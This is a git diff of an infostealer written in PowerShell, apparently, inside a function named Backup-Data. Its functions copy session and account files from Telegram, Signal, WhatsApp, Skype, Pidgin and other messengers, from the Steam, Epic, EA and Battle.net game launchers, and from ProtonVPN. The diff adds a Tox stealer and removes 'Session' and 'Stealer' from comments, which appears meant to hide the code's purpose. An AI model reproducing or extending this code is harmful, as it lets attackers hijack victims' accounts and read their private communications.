@@ -306,7 +306,7 @@ function Backup-Data {
 
     # All Messaging Sessions
     
-    # Telegram Session
+    # Telegram 
     function telegramstealer {
         $processname = "telegram"
         $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
@@ -346,7 +346,7 @@ function Backup-Data {
     telegramstealer
 
 
-    # Element Session 
+    # Element  
     function elementstealer {
         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
         if (!(Test-Path $elementfolder)) { return }
@@ -358,7 +358,7 @@ function Backup-Data {
     elementstealer
 
 
-    # ICQ Session 
+    # ICQ  
     function icqstealer {
         $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
         if (!(Test-Path $icqfolder)) { return }
@@ -369,7 +369,7 @@ function Backup-Data {
     icqstealer
 
 
-    # Signal Session 
+    # Signal  
     function signalstealer {
         $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
         if (!(Test-Path $signalfolder)) { return }
@@ -382,7 +382,7 @@ function Backup-Data {
     signalstealer
 
 
-    # Viber Session 
+    # Viber  
     function viberstealer {
         $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
         if (!(Test-Path $viberfolder)) { return }
@@ -405,7 +405,7 @@ function Backup-Data {
     viberstealer
 
 
-    # Whatsapp Session 
+    # Whatsapp  
     function whatsappstealer {
         $whatsapp_session = "$folder_messaging\Whatsapp"
         New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
@@ -430,7 +430,7 @@ function Backup-Data {
     }
     whatsappstealer
 
-    # Skype Session
+    # Skype 
     function skype_stealer {
         $skypefolder = "$env:appdata\microsoft\skype for desktop"
         if (!(Test-Path $skypefolder)) { return }
@@ -440,6 +440,8 @@ function Backup-Data {
     }
     skype_stealer
     
+	
+	# Pidgin 
     function pidgin_stealer {
         $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
         if (!(Test-Path $pidgin_folder)) { return }
@@ -448,10 +450,20 @@ function Backup-Data {
         Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
     }
     pidgin_stealer
+	
+	# Tox 
+    function tox_stealer {
+            $tox_folder = "$env:appdata\Tox"
+            if (!(Test-Path $tox_folder)) { return }
+            $tox_session = "$folder_messaging\Tox"
+            New-Item -ItemType Directory -Force -Path $tox_session | Out-Null
+            Get-ChildItem -Path "$tox_folder" |  Copy-Item -Destination $tox_session -Recurse -Force
+    }
+    tox_stealer
 
     # All Gaming Sessions
     
-    # Steam Session Stealer
+    # Steam 
     function steamstealer {
         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
         if (!(Test-Path $steamfolder)) { return }
@@ -466,7 +478,7 @@ function Backup-Data {
     steamstealer
 
 
-    # Minecraft Session Stealer
+    # Minecraft 
     function minecraftstealer {
         $minecraft_session = "$folder_gaming\Minecraft"
         if (!(Test-Path $minecraft_session)) { return }
@@ -478,7 +490,7 @@ function Backup-Data {
     }
     minecraftstealer
 
-    # Epicgames Session Stealer
+    # Epicgames 
     function epicgames_stealer {
         $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
         if (!(Test-Path $epicgamesfolder)) { return }
@@ -490,7 +502,7 @@ function Backup-Data {
     }
     epicgames_stealer
 
-    # Ubisoft Session Stealer
+    # Ubisoft 
     function ubisoftstealer {
         $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
         if (!(Test-Path $ubisoftfolder)) { return }
@@ -500,7 +512,7 @@ function Backup-Data {
     }
     ubisoftstealer
 
-    # EA Session Stealer
+    # EA 
     function electronic_arts {
         $eafolder = "$env:localappdata\Electronic Arts\EA Desktop\CEF"
         if (!(Test-Path $eafolder)) { return }
@@ -513,7 +525,7 @@ function Backup-Data {
     }
     electronic_arts
 
-    # Growtopia Stealer
+    # Growtopia 
     function growtopiastealer {
         $growtopiafolder = "$env:localappdata\Growtopia"
         if (!(Test-Path $growtopiafolder)) { return }
@@ -524,6 +536,7 @@ function Backup-Data {
     }
     growtopiastealer
 
+    # Battle.net
     function battle_net_stealer {
         $battle_folder = "$env:appdata\Battle.net"
         if (!(Test-Path $battle_folder)) { return }
@@ -538,7 +551,6 @@ function Backup-Data {
 
 
     # All VPN Sessions
-
 
     # ProtonVPN
     function protonvpnstealer {   
